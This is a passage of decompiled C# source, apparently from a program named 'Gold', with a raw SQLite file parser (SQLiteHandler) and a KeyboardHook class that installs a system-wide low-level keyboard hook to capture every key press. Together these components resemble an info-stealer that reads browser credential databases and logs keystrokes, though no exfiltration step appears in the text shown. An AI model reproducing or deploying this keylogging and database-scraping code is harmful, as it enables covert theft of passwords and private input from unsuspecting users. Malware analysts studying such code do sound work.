              this.master_table_entries[checked (num1 + num3)].item_name = Encoding.Unicode.GetString(this.db_bytes, Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(uint64), new Decimal(num4)), new Decimal(numArray[0]))), checked ((int) numArray[1]));
            else if (Decimal.Compare(new Decimal(this.encoding), 3M) == 0)
              this.master_table_entries[checked (num1 + num3)].item_name = Encoding.BigEndianUnicode.GetString(this.db_bytes, Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(uint64), new Decimal(num4)), new Decimal(numArray[0]))), checked ((int) numArray[1]));
            this.master_table_entries[checked (num1 + num3)].root_num = checked ((long) this.ConvertToInteger(Convert.ToInt32(Decimal.Add(Decimal.Add(Decimal.Add(Decimal.Add(new Decimal(uint64), new Decimal(num4)), new Decimal(numArray[0])), new Decimal(numArray[1])), new Decimal(numArray[2]))), (int) numArray[3]));
            if (Decimal.Compare(new Decimal(this.encoding), 1M) == 0)
              this.master_table_entries[checked (num1 + num3)].sql_statement = Encoding.Default.GetString(this.db_bytes, Convert.ToInt32(Decimal.Add(Decimal.Add(Decimal.Add(Decimal.Add(Decimal.Add(new Decimal(uint64), new Decimal(num4)), new Decimal(numArray[0])), new Decimal(numArray[1])), new Decimal(numArray[2])), new Decimal(numArray[3]))), checked ((int) numArray[4]));
            else if (Decimal.Compare(new Decimal(this.encoding), 2M) == 0)
              this.master_table_entries[checked (num1 + num3)].sql_statement = Encoding.Unicode.GetString(this.db_bytes, Convert.ToInt32(Decimal.Add(Decimal.Add(Decimal.Add(Decimal.Add(Decimal.Add(new Decimal(uint64), new Decimal(num4)), new Decimal(numArray[0])), new Decimal(numArray[1])), new Decimal(numArray[2])), new Decimal(numArray[3]))), checked ((int) numArray[4]));
            else if (Decimal.Compare(new Decimal(this.encoding), 3M) == 0)
              this.master_table_entries[checked (num1 + num3)].sql_statement = Encoding.BigEndianUnicode.GetString(this.db_bytes, Convert.ToInt32(Decimal.Add(Decimal.Add(Decimal.Add(Decimal.Add(Decimal.Add(new Decimal(uint64), new Decimal(num4)), new Decimal(numArray[0])), new Decimal(numArray[1])), new Decimal(numArray[2])), new Decimal(numArray[3]))), checked ((int) numArray[4]));
            checked { ++num3; }
          }
        }
        else
        {
          if (this.db_bytes[checked ((int) Offset)] != (byte) 5)
            return;
          int uint16 = (int) Convert.ToUInt16(Decimal.Subtract(new Decimal(this.ConvertToInteger(Convert.ToInt32(Decimal.Add(new Decimal(Offset), 3M)), 2)), 1M));
          int num = 0;
          while (num <= uint16)
          {
            ushort integer = checked ((ushort) this.ConvertToInteger(Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(Offset), 12M), new Decimal(num * 2))), 2));
            if (Decimal.Compare(new Decimal(Offset), 100M) == 0)
              this.ReadMasterTable(Convert.ToUInt64(Decimal.Multiply(Decimal.Subtract(new Decimal(this.ConvertToInteger((int) integer, 4)), 1M), new Decimal((int) this.page_size))));
            else
              this.ReadMasterTable(Convert.ToUInt64(Decimal.Multiply(Decimal.Subtract(new Decimal(this.ConvertToInteger(checked ((int) (Offset + (ulong) integer)), 4)), 1M), new Decimal((int) this.page_size))));
            checked { ++num; }
          }
          this.ReadMasterTable(Convert.ToUInt64(Decimal.Multiply(Decimal.Subtract(new Decimal(this.ConvertToInteger(Convert.ToInt32(Decimal.Add(new Decimal(Offset), 8M)), 4)), 1M), new Decimal((int) this.page_size))));
        }
      }

      private bool ReadTableFromOffset(ulong Offset)
      {
        if (this.db_bytes[checked ((int) Offset)] == (byte) 13)
        {
          ushort uint16 = Convert.ToUInt16(Decimal.Subtract(new Decimal(this.ConvertToInteger(Convert.ToInt32(Decimal.Add(new Decimal(Offset), 3M)), 2)), 1M));
          int num1 = 0;
          if (this.table_entries != null)
          {
            num1 = this.table_entries.Length;
            this.table_entries = (Gold.Gold.SQLiteHandler.table_entry[]) Microsoft.VisualBasic.CompilerServices.Utils.CopyArray((Array) this.table_entries, (Array) new Gold.Gold.SQLiteHandler.table_entry[checked (this.table_entries.Length + (int) uint16 + 1)]);
          }
          else
            this.table_entries = new Gold.Gold.SQLiteHandler.table_entry[checked ((int) uint16 + 1)];
          int num2 = (int) uint16;
          int num3 = 0;
          while (num3 <= num2)
          {
            ulong integer = this.ConvertToInteger(Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(Offset), 8M), new Decimal(checked (num3 * 2)))), 2);
            if (Decimal.Compare(new Decimal(Offset), 100M) != 0)
              checked { integer += Offset; }
            int endIndex1 = this.GVL(checked ((int) integer));
            this.CVL(checked ((int) integer), endIndex1);
            int endIndex2 = this.GVL(Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(integer), Decimal.Subtract(new Decimal(endIndex1), new Decimal(integer))), 1M)));
            this.table_entries[checked (num1 + num3)].row_id = this.CVL(Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(integer), Decimal.Subtract(new Decimal(endIndex1), new Decimal(integer))), 1M)), endIndex2);
            ulong uint64 = Convert.ToUInt64(Decimal.Add(Decimal.Add(new Decimal(integer), Decimal.Subtract(new Decimal(endIndex2), new Decimal(integer))), 1M));
            int endIndex3 = this.GVL(checked ((int) uint64));
            int endIndex4 = endIndex3;
            long num4 = this.CVL(checked ((int) uint64), endIndex3);
            Gold.Gold.SQLiteHandler.record_header_field[] arySrc = (Gold.Gold.SQLiteHandler.record_header_field[]) null;
            long num5 = Convert.ToInt64(Decimal.Add(Decimal.Subtract(new Decimal(uint64), new Decimal(endIndex3)), 1M));
            int index1 = 0;
            while (num5 < num4)
            {
              arySrc = (Gold.Gold.SQLiteHandler.record_header_field[]) Microsoft.VisualBasic.CompilerServices.Utils.CopyArray((Array) arySrc, (Array) new Gold.Gold.SQLiteHandler.record_header_field[checked (index1 + 1)]);
              int startIndex = checked (endIndex4 + 1);
              endIndex4 = this.GVL(startIndex);
              arySrc[index1].type = this.CVL(startIndex, endIndex4);
              arySrc[index1].size = arySrc[index1].type <= 9L ? (long) this.SQLDataTypeSize[checked ((int) arySrc[index1].type)] : (!this.IsOdd(arySrc[index1].type) ? checked ((long) Math.Round(unchecked ((double) checked (arySrc[index1].type - 12L) / 2.0))) : checked ((long) Math.Round(unchecked ((double) checked (arySrc[index1].type - 13L) / 2.0))));
              num5 = checked (num5 + (long) (endIndex4 - startIndex) + 1L);
              checked { ++index1; }
            }
            this.table_entries[checked (num1 + num3)].content = new string[checked (arySrc.Length - 1 + 1)];
            int num6 = 0;
            int num7 = checked (arySrc.Length - 1);
            int index2 = 0;
            while (index2 <= num7)
            {
              if (arySrc[index2].type > 9L)
              {
                if (!this.IsOdd(arySrc[index2].type))
                {
                  if (Decimal.Compare(new Decimal(this.encoding), 1M) == 0)
                    this.table_entries[checked (num1 + num3)].content[index2] = Encoding.Default.GetString(this.db_bytes, Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(uint64), new Decimal(num4)), new Decimal(num6))), checked ((int) arySrc[index2].size));
                  else if (Decimal.Compare(new Decimal(this.encoding), 2M) == 0)
                    this.table_entries[checked (num1 + num3)].content[index2] = Encoding.Unicode.GetString(this.db_bytes, Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(uint64), new Decimal(num4)), new Decimal(num6))), checked ((int) arySrc[index2].size));
                  else if (Decimal.Compare(new Decimal(this.encoding), 3M) == 0)
                    this.table_entries[checked (num1 + num3)].content[index2] = Encoding.BigEndianUnicode.GetString(this.db_bytes, Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(uint64), new Decimal(num4)), new Decimal(num6))), checked ((int) arySrc[index2].size));
                }
                else
                  this.table_entries[checked (num1 + num3)].content[index2] = Encoding.Default.GetString(this.db_bytes, Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(uint64), new Decimal(num4)), new Decimal(num6))), checked ((int) arySrc[index2].size));
              }
              else
                this.table_entries[checked (num1 + num3)].content[index2] = Conversions.ToString(this.ConvertToInteger(Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(uint64), new Decimal(num4)), new Decimal(num6))), checked ((int) arySrc[index2].size)));
              num6 = checked ((int) ((long) num6 + arySrc[index2].size));
              checked { ++index2; }
            }
            checked { ++num3; }
          }
        }
        else if (this.db_bytes[checked ((int) Offset)] == (byte) 5)
        {
          int uint16 = (int) Convert.ToUInt16(Decimal.Subtract(new Decimal(this.ConvertToInteger(Convert.ToInt32(Decimal.Add(new Decimal(Offset), 3M)), 2)), 1M));
          int num = 0;
          while (num <= uint16)
          {
            ushort integer = checked ((ushort) this.ConvertToInteger(Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(Offset), 12M), new Decimal(num * 2))), 2));
            this.ReadTableFromOffset(Convert.ToUInt64(Decimal.Multiply(Decimal.Subtract(new Decimal(this.ConvertToInteger(checked ((int) (Offset + (ulong) integer)), 4)), 1M), new Decimal((int) this.page_size))));
            checked { ++num; }
          }
          this.ReadTableFromOffset(Convert.ToUInt64(Decimal.Multiply(Decimal.Subtract(new Decimal(this.ConvertToInteger(Convert.ToInt32(Decimal.Add(new Decimal(Offset), 8M)), 4)), 1M), new Decimal((int) this.page_size))));
        }
        return true;
      }

      public bool ReadTable(string TableName)
      {
        int index1 = -1;
        int length1 = this.master_table_entries.Length;
        int index2 = 0;
        while (index2 <= length1)
        {
          if (this.master_table_entries[index2].item_name.ToLower().CompareTo(TableName.ToLower()) == 0)
          {
            index1 = index2;
            break;
          }
          checked { ++index2; }
        }
        if (index1 == -1)
          return false;
        string[] strArray = this.master_table_entries[index1].sql_statement.Substring(checked (this.master_table_entries[index1].sql_statement.IndexOf("(") + 1)).Split(',');
        int num = checked (strArray.Length - 1);
        int index3 = 0;
        while (index3 <= num)
        {
          strArray[index3] = Strings.LTrim(strArray[index3]);
          int length2 = strArray[index3].IndexOf(" ");
          if (length2 > 0)
            strArray[index3] = strArray[index3].Substring(0, length2);
          if (strArray[index3].IndexOf("UNIQUE") != 0)
          {
            this.field_names = (string[]) Microsoft.VisualBasic.CompilerServices.Utils.CopyArray((Array) this.field_names, (Array) new string[checked (index3 + 1)]);
            this.field_names[index3] = strArray[index3];
            checked { ++index3; }
          }
          else
            break;
        }
        return this.ReadTableFromOffset(checked ((ulong) ((this.master_table_entries[index1].root_num - 1L) * (long) this.page_size)));
      }

      public int GetRowCount() => this.table_entries.Length;

      public string GetValue(int row_num, int field)
      {
        if (row_num >= this.table_entries.Length)
          return (string) null;
        return field >= this.table_entries[row_num].content.Length ? (string) null : this.table_entries[row_num].content[field];
      }

      public string GetValue(int row_num, string field)
      {
        int field1 = -1;
        int length = this.field_names.Length;
        int index = 0;
        while (index <= length)
        {
          if (this.field_names[index].ToLower().CompareTo(field.ToLower()) == 0)
          {
            field1 = index;
            break;
          }
          checked { ++index; }
        }
        return field1 == -1 ? (string) null : this.GetValue(row_num, field1);
      }

      public string[] GetTableNames()
      {
        string[] arySrc = (string[]) null;
        int index1 = 0;
        int num = checked (this.master_table_entries.Length - 1);
        int index2 = 0;
        while (index2 <= num)
        {
          if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(this.master_table_entries[index2].item_type, "table", false) == 0)
          {
            arySrc = (string[]) Microsoft.VisualBasic.CompilerServices.Utils.CopyArray((Array) arySrc, (Array) new string[checked (index1 + 1)]);
            arySrc[index1] = this.master_table_entries[index2].item_name;
            checked { ++index1; }
          }
          checked { ++index2; }
        }
        return arySrc;
      }

      [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
      public SQLiteHandler(string baseName)
      {
        this.SQLDataTypeSize = new byte[10]
        {
          (byte) 0,
          (byte) 1,
          (byte) 2,
          (byte) 3,
          (byte) 4,
          (byte) 6,
          (byte) 8,
          (byte) 8,
          (byte) 0,
          (byte) 0
        };
        if (!System.IO.File.Exists(baseName))
          return;
        FileSystem.FileOpen(1, baseName, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared);
        string s = Strings.Space(checked ((int) FileSystem.LOF(1)));
        FileSystem.FileGet(1, ref s);
        FileSystem.FileClose(1);
        this.db_bytes = Encoding.Default.GetBytes(s);
        if (Encoding.Default.GetString(this.db_bytes, 0, 15).CompareTo("SQLite format 3") != 0)
          throw new Exception("Not a valid SQLite 3 Database File");
        if (this.db_bytes[52] != (byte) 0)
          throw new Exception("Auto-vacuum capable database is not supported");
        if (Decimal.Compare(new Decimal(this.ConvertToInteger(44, 4)), 4M) >= 0)
          throw new Exception("No supported Schema layer file-format");
        this.page_size = checked ((ushort) this.ConvertToInteger(16, 2));
        this.encoding = this.ConvertToInteger(56, 4);
        if (Decimal.Compare(new Decimal(this.encoding), 0M) == 0)
          this.encoding = 1UL;
        this.ReadMasterTable(100UL);
      }

      private struct record_header_field
      {
        public long size;
        public long type;
      }

      private struct table_entry
      {
        public long row_id;
        public string[] content;
      }

      private struct sqlite_master_entry
      {
        public long row_id;
        public string item_type;
        public string item_name;
        public string astable_name;
        public long root_num;
        public string sql_statement;
      }
    }

    public class KeyboardHook
    {
      private const int HC_ACTION = 0;
      private const int WH_KEYBOARD_LL = 13;
      private const int WM_KEYDOWN = 256;
      private const int WM_KEYUP = 257;
      private const int WM_SYSKEYDOWN = 260;
      private const int WM_SYSKEYUP = 261;
      private static int KeyHook;
      private static Gold.Gold.KeyboardHook.KeyboardProcDelegate KeyHookDelegate;

      [DllImport("user32", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern int SetWindowsHookEx(
        int idHook,
        Gold.Gold.KeyboardHook.KeyboardProcDelegate lpfn,
        int hmod,
        int dwThreadId);

      [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern int CallNextHookEx(
        int hHook,
        int nCode,
        int wParam,
        Gold.Gold.KeyboardHook.KBDLLHOOKSTRUCT lParam);

      [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern int UnhookWindowsHookEx(int hHook);

      public static event Gold.Gold.KeyboardHook.KeyDownEventHandler KeyDown;

      public static event Gold.Gold.KeyboardHook.KeyUpEventHandler KeyUp;

      public KeyboardHook()
      {
        Gold.Gold.KeyboardHook.KeyHookDelegate = new Gold.Gold.KeyboardHook.KeyboardProcDelegate(Gold.Gold.KeyboardHook.KeyboardProc);
        Gold.Gold.KeyboardHook.KeyHook = Gold.Gold.KeyboardHook.SetWindowsHookEx(13, Gold.Gold.KeyboardHook.KeyHookDelegate, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
      }

      private static int KeyboardProc(
        int nCode,
        int wParam,
        ref Gold.Gold.KeyboardHook.KBDLLHOOKSTRUCT lParam)
      {
        if (nCode == 0)
        {
          switch (wParam)
          {
            case 256:
            case 260:
              Gold.Gold.KeyboardHook.KeyDownEventHandler keyDownEvent = Gold.Gold.KeyboardHook.KeyDownEvent;
              if (keyDownEvent != null)
              {
                keyDownEvent((Keys) lParam.vkCode);
                break;
              }
              break;
            case 257:
            case 261:
              Gold.Gold.KeyboardHook.KeyUpEventHandler keyUpEvent = Gold.Gold.KeyboardHook.KeyUpEvent;
              if (keyUpEvent != null)
              {
                keyUpEvent((Keys) lParam.vkCode);
                break;
              }
              break;
          }
        }
        return Gold.Gold.KeyboardHook.CallNextHookEx(Gold.Gold.KeyboardHook.KeyHook, nCode, wParam, lParam);
      }

      ~KeyboardHook()
      {
        Gold.Gold.KeyboardHook.UnhookWindowsHookEx(Gold.Gold.KeyboardHook.KeyHook);
        // ISSUE: explicit finalizer call
        base.Finalize();
      }

      private struct KBDLLHOOKSTRUCT
      {
        public int vkCode;
        public int scancode;
        public int flags;
        public int time;
        public int dwExtraInfo;
      }

      private delegate int KeyboardProcDelegate(
        int nCode,
        int wParam,
        ref Gold.Gold.KeyboardHook.KBDLLHOOKSTRUCT lParam);

      public delegate void KeyDownEventHandler(Keys Key);

      public delegate void KeyUpEventHandler(Keys Key);
    }
  }
}
